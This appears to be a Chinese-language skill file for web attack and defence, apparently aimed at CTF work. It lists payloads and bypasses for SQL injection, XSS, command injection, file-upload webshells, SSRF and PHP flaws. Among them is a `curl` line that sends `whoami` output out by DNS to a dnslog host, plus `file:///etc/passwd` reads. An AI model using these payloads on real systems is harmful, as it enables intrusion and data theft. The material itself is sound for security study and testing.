---
name: web
description: Web 安全攻防技术，包括 SQL 注入、XSS、文件上传、命令注入、SSRF、反序列化等常见漏洞的识别与利用。
tags:
  - sql-injection
  - xss
  - file-upload
  - command-injection
  - ssrf
  - deserialization
  - php
---

# Web 安全攻防方法论

## 通用分析流程

1. **信息收集**：识别 Web 框架、中间件版本、编程语言、WAF 类型
2. **目录扫描**：使用 dirsearch/gobuster 发现隐藏路径和备份文件
3. **参数分析**：检查 URL 参数、Cookie、HTTP 头的注入点
4. **漏洞验证**：对可疑点进行 PoC 验证

## SQL 注入

- **判断类型**：字符型 vs 数字型，单引号 vs 双引号
- **联合查询**：`ORDER BY` 确定列数 -> `UNION SELECT` 提取数据
- **盲注**：布尔盲注 `AND 1=1`/`AND 1=2`，时间盲注 `SLEEP()`/`BENCHMARK()`
- **常用工具**：sqlmap `--batch --dbs --current-user`
- **绕过技巧**：大小写混合、内联注释 `/**/`、双重编码、HPP 参数污染
- **WAF 绕过**：使用 `/*!50000select*/`、`%0a` 换行、`<>` 替代空格

## XSS

- **反射型**：输入直接输出到页面，检查 `<>\"'/` 过滤情况
- **存储型**：输入持久化存储，关注评论、用户名等字段
- **DOM 型**：检查 `document.location`、`innerHTML` 等 DOM 操作
- **绕过**：`<img onerror=alert(1)>`、`<svg onload=alert(1)>`、编码绕过

## 命令注入

- **分隔符**：`;`、`&&`、`||`、`|`、`\n`、`` ` ``
- **绕过空格**：`$IFS`、`{cmd,arg}`、`%09`、`<` 重定向
- **绕过黑名单**：变量拼接 `a=fl;b=ag;cat $a$b`、通配符 `cat /fl*`、base64 编码
- **无回显**：DNS 外带 `curl \`whoami\`.xxx.dnslog.cn`、时间盲注

## 文件上传

- **前端绕过**：禁用 JS 或直接修改请求
- **MIME 类型**：修改 `Content-Type` 为 `image/png`
- **扩展名**：`.php5`、`.phtml`、`.pht`、`.php.jpg`（Apache 解析漏洞）
- **文件头**：添加 `GIF89a` 或 PNG 文件头
- **二次渲染**：上传后检查是否被裁剪，构造在裁剪后仍有效的图片马
- **.htaccess**：上传 `.htaccess` 添加自定义解析规则

## SSRF

- **协议**：`file:///etc/passwd`、`dict://`、`gopher://`
- **内网探测**：`http://127.0.0.1:端口`、`http://192.168.x.x`
- **绕过**：`@` 符号 `http://attacker.com@127.0.0.1`、进制转换 `0x7f000001`、IPv6 `[::1]`
- **DNS Rebinding**：利用 DNS 解析时间差绕过校验

## PHP 特性

- **弱类型**：`==` 比较时 `"0e123" == "0e456"` 为 True
- **伪协议**：`php://filter/convert.base64-encode/resource=`、`php://input`
- **反序列化**：`__construct`、`__destruct`、`__wakeup`、`__toString` 魔术方法
- **变量覆盖**：`extract()`、`parse_str()`、`$$var`
- **文件包含**：`../` 目录穿越、`%00` 截断（PHP < 5.3.4）
